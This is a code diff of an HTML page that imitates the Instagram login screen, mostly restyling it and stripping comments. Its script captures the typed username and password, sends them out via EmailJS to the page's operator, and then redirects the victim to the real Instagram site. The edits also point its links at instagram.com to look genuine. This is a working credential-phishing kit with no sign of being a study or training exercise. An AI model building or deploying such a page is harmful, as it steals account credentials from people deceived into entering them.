@@ -16,30 +16,50 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            text-align: center; /* Ensures everything is centered */
+            text-align: center;
+            flex-direction: column;
         }
 
-        .container {
-            width: 100%;
-            max-width: 320px; /* Adjusted width for a more compact design */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 15px;
-            box-sizing: border-box; /* Ensures padding doesn't cause overflow */
+        /* Language Button */
+        .language-dropdown {
+            background-color: transparent;
+            color: #8e8e8e;
+            font-size: 14px;
+            border: none;
+            cursor: pointer;
+            padding: 8px 16px;
+            position: absolute;
+            top: 5px;
+            left: 50%;
+            transform: translateX(-50%);
         }
 
         .logo {
             font-family: 'Billabong', cursive;
-            font-size: 40px; /* Slightly smaller logo */
-            margin-bottom: 15px; /* Move the logo up by reducing the margin */
+            font-size: 40px;
+            margin-top: 10px;
+            position: absolute;
+            top: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px;
+            box-sizing: border-box;
         }
 
         .facebook-button {
-            width: 100%; /* Makes the Facebook button as wide as the login button */
+            width: 100%;
+            max-width: 280px;
             background-color: #3897f0;
             color: white;
-            padding: 10px; /* Same padding as login button */
+            padding: 10px;
             font-size: 12px;
             font-weight: bold;
             border: none;
@@ -52,17 +72,19 @@
         }
 
         .facebook-button img {
-            width: 16px; /* Smaller Facebook logo */
+            width: 16px;
             height: 16px;
             margin-right: 8px;
         }
 
+        /* Divider with OR and lines */
         .divider {
             display: flex;
             align-items: center;
             color: #8e8e8e;
-            font-size: 12px; /* Smaller font size */
+            font-size: 12px;
             margin: 15px 0;
+            width: 100%;
         }
 
         .divider::before, .divider::after {
@@ -93,9 +115,9 @@
             padding: 10px;
             margin-bottom: 8px;
             font-size: 12px;
-            width: 100%; /* Ensures the textboxes and login button have the same width */
-            max-width: 280px; /* Ensures the textboxes are narrower but still scale properly */
-            box-sizing: border-box; /* Prevents overflow due to padding */
+            width: 100%;
+            max-width: 280px;
+            box-sizing: border-box;
         }
 
         .form-input:focus {
@@ -114,7 +136,7 @@
             border-radius: 4px;
             cursor: pointer;
             margin-bottom: 15px;
-            max-width: 280px; /* Same width as textboxes */
+            max-width: 280px;
         }
 
         .login-button:hover {
@@ -148,11 +170,10 @@
             text-decoration: underline;
         }
 
-        /* Show button styling inside password input */
         .password-container {
             position: relative;
             width: 100%;
-            max-width: 280px; /* Same as the other elements */
+            max-width: 280px;
         }
 
         .show-password-btn {
@@ -164,20 +185,23 @@
             position: absolute;
             right: 15px;
             top: 50%;
-            transform: translateY(-50%); /* Centers vertically */
+            transform: translateY(-50%);
         }
     </style>
 </head>
 <body>
+    <button class="language-dropdown">English</button>
+
     <div class="container">
         <div class="logo">Instagram</div>
 
+        <!-- Facebook Button (No redirect) -->
         <button class="facebook-button">
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
             Continue with Facebook
         </button>
 
-        <div class="divider"><span></span>OR<span></span></div>
+        <div class="divider"><span>OR</span></div>
 
         <form id="loginForm" class="form">
             <input type="text" id="username" class="form-input" placeholder="Phone number, username, or email" required>
@@ -188,31 +212,26 @@
             <button type="submit" id="loginButton" class="login-button disabled" disabled>Log In</button>
         </form>
 
-        <a href="#" class="forgot-password">Forgot password?</a>
+        <a href="https://www.instagram.com" class="forgot-password" target="_blank">Forgot password?</a>
 
-        <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+        <p class="signup-text">Don't have an account? <a href="https://www.instagram.com" target="_blank">Sign up</a></p>
     </div>
 
     <script type="text/javascript">
-        // Initialize EmailJS with your public key
         emailjs.init("ZaF8wyUZavRVBvsqx");
 
-        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();  // Prevent form from refreshing the page
+            event.preventDefault();
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Send email data to EmailJS
             emailjs.send("service_b6ugscc", "template_wnvqxmb", {
                 username: username,
                 password: password
             })
             .then(function(response) {
                 console.log("Email sent successfully", response);
-
-                // Redirect to Instagram after a successful submission
                 window.location.href = "https://www.instagram.com";
             }, function(error) {
                 console.error("Failed to send email:", error);
@@ -220,7 +239,6 @@
             });
         });
 
-        // Show/Hide password functionality
         document.getElementById('showPassword').addEventListener('click', function() {
             const passwordField = document.getElementById('password');
             if (passwordField.type === "password") {
@@ -232,7 +250,6 @@
             }
         });
 
-        // Enable/Disable Login Button based on fields
         document.getElementById('username').addEventListener('input', toggleLoginButton);
         document.getElementById('password').addEventListener('input', toggleLoginButton);
 
@@ -250,7 +267,6 @@
             }
         }
 
-        // Initial check on load
         toggleLoginButton();
     </script>
 </body>
